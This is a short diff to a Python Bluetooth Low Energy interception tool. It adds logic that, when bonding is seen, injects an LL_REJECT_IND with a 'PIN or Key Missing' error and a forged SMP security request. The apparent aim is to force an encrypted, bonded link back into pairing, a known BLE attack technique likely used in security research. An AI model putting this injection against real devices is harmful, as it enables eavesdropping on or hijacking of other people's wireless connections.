@@ -6,7 +6,7 @@
 # Released as open source under GPLv3
 
 import argparse, sys, signal
-from time import time
+from time import time, sleep
 from select import select
 from struct import pack, unpack
 
@@ -162,8 +162,29 @@ def ser_recv_print_forward(conn, quiet):
     if isinstance(msg, LlControlMessage) and msg.opcode == 0x03 and bonding:
         print("LL_ENC_REQ seen, this means that next pairing request should be modified \n")
         seen_pairing_req = True
-        LLENCREQ_event = msg.event
-        # Replace pairing request with LL_REJECT_IND if bonding is set
+
+        reject_opcode = 0x0D
+        error_code = 0x06
+        new_len = 2  # 1-byte opcode + 1-byte error
+
+        # # Compose PDU cleanly from scratch
+        # reject_pdu = bytes([llid_masked, new_len, reject_opcode, error_code])
+
+        # # Optionally ensure no trailing garbage
+        # reject_pdu = reject_pdu[:4]  # truncate to exact length if necessary
+
+        reject_pdu = bytes([reject_opcode, error_code])
+        # Transmit with fresh or compatible event if possible
+        hw.cmd_transmit(3, reject_pdu)  # safer to skip reusing old event
+        print(f"[INJECT] Sent LL_REJECT_IND (0x06) to central: {reject_pdu.hex()}")
+        
+
+        smp_sec_req = bytes([0x02, 0x00, 0x06, 0x00, 0x0B, 0x09])  # L2CAP + SMP
+        #llid_masked = (old_hdr & 0b11111100) | 0x02  # LLID = 0b10 = L2CAP Start
+        #msg.body = bytes([llid_masked, new_len]) + smp_sec_req
+        hw.cmd_transmit(2, smp_sec_req)  # safer to skip reusing old event
+        bonding = False
+
     if not empty and isinstance(msg, PacketMessage) and False:
         if is_smp_pairing_req(msg.body) and seen_pairing_req: 
             print("[MODIFY] Replacing Pairing request with LL_REJECT_IND (PIN or Key Missing)")
